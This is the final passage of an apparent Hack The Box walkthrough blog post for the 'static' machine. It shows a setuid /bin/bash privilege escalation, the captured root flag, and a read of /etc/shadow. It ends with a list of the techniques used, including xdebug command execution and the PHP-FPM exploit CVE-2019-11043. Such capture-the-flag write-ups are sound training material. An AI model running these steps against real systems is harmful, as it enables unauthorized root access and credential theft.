class="line">create-&gt;CN=</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">www-data@pki:/tmp/pwn$ <span class="built_in">ls</span> -al /bin/bash</span><br><span class="line"><span class="built_in">ls</span> -al /bin/bash</span><br><span class="line">-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash</span><br></pre></td></tr></table></figure>

<p>Now just execute the &#x2F;bin&#x2F;bash -p and get the root.txt file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">www-data@pki:/tmp/pwn$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-4.4<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">bash-4.4<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">bash-4.4<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">bash-4.4<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">notes.txt  root.txt</span><br><span class="line">bash-4.4<span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">25492e1db711e8e76bd204f5b033490a</span><br><span class="line">bash-4.4<span class="comment"># cat notes.txt</span></span><br><span class="line"><span class="built_in">cat</span> notes.txt</span><br><span class="line">Resources used <span class="keyword">for</span> creation of this box:</span><br><span class="line"></span><br><span class="line">https://github.com/lfkeitel/php-totp</span><br><span class="line">https://github.com/gteissier/xdebug-shell</span><br><span class="line">https://github.com/neex/phuip-fpizdam</span><br><span class="line"></span><br><span class="line">bash-4.4<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow | grep root</span><br><span class="line">root:*:18332:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2008.jpg"></li>
</ul>
<p>and we are done!</p>
<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
<li>dir fuzz</li>
<li>fix the corrupted gz file using fixgz</li>
<li>john crack hash</li>
<li>use firefox add-ons Authenticator to get OTP</li>
<li>xdebug Unauthenticated OS Command Execution</li>
<li>PHP-FPM Remote Code Execution Vulnerability (CVE-2019–11043)</li>
<li>download a file using just bash and nothing else</li>
<li>using pspy to monitor ersatool binary proccess</li>
<li>Linux Privilege Escalation Using PATH Variable</li>
</ul>
<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/06/26/static/" title="Hack-The-Box-walkthrough[static]">https://fdlucifer.github.io/2021/06/26/static/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/06/14/dynstr/" rel="prev" title="Hack-The-Box-walkthrough[dynstr]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[dynstr]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/06/27/explore/" rel="next" title="Hack-The-Box-walkthrough[explore]">
                  Hack-The-Box-walkthrough[explore] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">647k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:14</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
